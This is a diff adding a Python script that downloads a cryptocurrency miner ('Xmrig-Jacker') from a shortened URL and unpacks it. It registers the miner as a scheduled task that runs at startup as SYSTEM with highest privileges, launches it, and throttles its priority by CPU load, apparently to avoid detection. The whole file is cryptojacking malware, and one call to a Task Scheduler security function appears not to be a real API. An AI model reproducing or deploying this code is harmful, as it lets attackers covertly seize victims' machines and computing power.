@@ -1,0 +1,46 @@
+import os
+import subprocess
+import shutil
+import time
+import psutil
+import ctypes
+
+def download_and_extract(url, output_dir):
+    subprocess.run(["wget", url, "-O", os.path.join(output_dir, "Xmrig-Jacker-main.zip")])
+    shutil.unpack_archive(os.path.join(output_dir, "Xmrig-Jacker-main.zip"), output_dir)
+
+def main():
+    temp_dir = "C:\\temp"
+    xmrig_path = os.path.join(temp_dir, "Xmrig-Jacker-main", "xmrig", "xmrig.exe")
+
+    download_url = 'bit.ly/444WCb3'
+    download_and_extract(download_url, temp_dir)
+
+    action = f'"{xmrig_path}"'
+    ctypes.windll.taskschd.TaskSchedulerSetSecurityDescriptor(None, 4)
+    subprocess.run(["schtasks", "/Create", "/TN", "RunXmrig", "/SC", "ONSTART", "/RU", "SYSTEM", "/RL", "HIGHEST", "/TR", action])
+
+    # Start the xmrig.exe process immediately
+    subprocess.Popen([xmrig_path])
+
+    process_name = "xmrig.exe"
+    high_usage_threshold = 75
+    low_usage_threshold = 25
+
+    while True:
+        cpu_usage = psutil.cpu_percent(interval=5)
+
+        if cpu_usage >= high_usage_threshold:
+            for proc in psutil.process_iter(attrs=['pid', 'name']):
+                if process_name in proc.info['name']:
+                    p = psutil.Process(proc.info['pid'])
+                    p.nice(psutil.IDLE_PRIORITY_CLASS)
+
+        elif cpu_usage < low_usage_threshold:
+            for proc in psutil.process_iter(attrs=['pid', 'name']):
+                if process_name in proc.info['name']:
+                    p = psutil.Process(proc.info['pid'])
+                    p.nice(psutil.NORMAL_PRIORITY_CLASS)
+
+if __name__ == "__main__":
+    main()
